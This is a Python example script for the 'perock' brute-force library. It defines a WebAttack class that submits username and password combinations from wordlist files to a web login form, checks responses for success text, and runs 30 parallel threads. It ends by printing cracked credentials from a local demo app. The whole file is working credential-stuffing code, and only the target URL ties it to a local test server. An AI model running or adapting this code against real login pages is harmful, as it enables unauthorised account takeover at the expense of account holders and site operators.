import os
import time
import requests

from perock import forcetable
from perock import attack
from perock import runner


# Part of examples/setup_attack_class.py
# --------------------------------------

# The class is part of part of 'examples/setup_attack_class.py'
# Open setup_attack_class.py for more about Attack class
class WebAttack(attack.Attack):
    '''Example Attack class for brutuforcing on webpage login form'''
    def __init__(self, target, data: dict) -> None:
        super().__init__(target, data)
        self.responce: requests.Response

        # requests.exceptions.ConnectionError wont be raised
        # But will be treated as responce
        self.add_unraised_exception(requests.exceptions.ConnectionError)

    @classmethod
    def create_session(cls):
        # Creates session object to use with request
        # This session can improve prformance
        return requests.Session()

    def request(self):
        # Performs request into target and should return responce
        # Reponce can be anything other than None
        # Even exception is seen as responce indicating there was an error.
        session = self.get_session()
        if session == None:
            # session object wasnt provided
            # we then perform request direcly
            return requests.post(self.target, data=self.data)
        else:
            # session would improve request performance
            return session.post(self.target, data=self.data)

    def target_errors(self):
        # Should return True if target experienced errors
        if self.target_reached():
            status_code = self.responce.status_code
            return status_code >= 500 and status_code < 600
        # Target was never reached so no errors
        return False

    def client_errors(self):
        # Should return True if there was error caused by client.
        # This may include exceptions and error on target caused by client.
        if self.target_reached():
            status_code = self.responce.status_code
            return status_code >= 400 and status_code < 500
        # Let super class decide
        # Its possible that exception was raised.
        # Which caused target not to be reached
        return super().client_errors()

    def success(self):
        # Should return True if attack was successful
        # That means target was cracked.
        if self.target_reached():
            # Check if responce bytes contain text
            return b"Login successful" in self.responce.content
        # Not successful as target was not reached
        # There may be client error thats why target not reached
        return False

    def failure(self):
        # Should return True if attack was successful
        # That means it just failed without error
        if self.target_reached():
            # Check if responce bytes contain text
            if b"Failed to login" in self.responce.content:
                return True
            elif b"No such username" in self.responce.content:
                return True
            else:
                return False
        # Since target was not reached, there was never failure
        return False



# Part of examples/setup_table.py
# ----------------------------

# Sets up paths needed by this file
folder_path = os.path.split(os.path.abspath(__file__))[0]
asserts_path = os.path.join(folder_path, "asserts")

usernames_file = os.path.join(asserts_path, "usernames.txt")
passwords_file = os.path.join(asserts_path, "passwords.txt")

# FieldFile is better as removes leading space characters
usernames_field = forcetable.FieldFile("usernames", usernames_file)
passwords_field = forcetable.FieldFile("passwords",passwords_file)

# Set name/key to be used on each record
usernames_field.set_item_name("username")
passwords_field.set_item_name("password")


# Create list with the fields
# examples/setup_table.py has that covered.
fields = [usernames_field, passwords_field]

# Now let create table object from fields
table = forcetable.Table(enable_callable_product=False)
table.add_primary_field(usernames_field)
table.add_field(passwords_field)




# This is part of this example
# Example for using runner module or objects
# ------------------------------------------

# Ensure that webapp is running on examples/webapp


# Creates runner object for WebAttack class
# Realise that this runs on threads 
# target and table are neccessay and should be set.
runner_object = runner.RunnerBlock(WebAttack)
runner_object.set_target('http://127.0.0.1:5000/login')
runner_object.set_table(table)

# Sets executo to be used default - ThreadPoolExecutor
#runner_object.set_max_workers(put executor here)

# Sets number of workers to be used.
# It could define number of threads depending on executor.
runner_object.set_max_workers(30)

# Enables optimisations(requires primary field in table)
# This would skip some records in table.
# Optimiation is good for username-password attack.
# Username is tried until there is match.
# After that runner moves to another username.
runner_object.enable_optimise()

# Would cancel/stop runner immediately on success.
# This is great if optimisations not enabled.
# You dont want to try all username-password(who knows billions)
#runner_object.enable_cancel_immediately()

# Sets maximum number of tasks that can be executed
# Dont confuse it with number of workers.
# It all depends if maximum workers can handle them.
runner_object.set_max_parallel_tasks(30)

# Sets maximum numer of primary items executed at in parallel.
# E.g multiple usernames can be tried in parrallel
# This primary primary field in table
#runner_object.set_max_parallel_primary_tasks(10)

# Maximum success records to cancel/stop runner.
# Important if you have limit on number of success records.
#runner_object.set_max_success_records(4)


start_time = time.time()

# Runs runner object until conditions are met.
# How it takes would depend values set on previus methods
runner_object.run()
success_records = runner_object.get_success_records()

duration = time.time() - start_time

print(success_records)
# [{'password': 'underdog', 'username': 'JACKSON'}, 
# {'password': 'titanium', 'username': 'THOMAS'}, 
# {'password': '1029384756', 'username': 'BROWN'}, 
# {'password': 'shuttle', 'username': 'ANDERSON'}, 
# {'password': 'bigboss', 'username': 'MARTINEZ'}]
print(f"Took {duration} seconds")
# Took 247.02167010307312 seconds

# Dont know why webapp is so slow
# Maybe on your machine things will be better.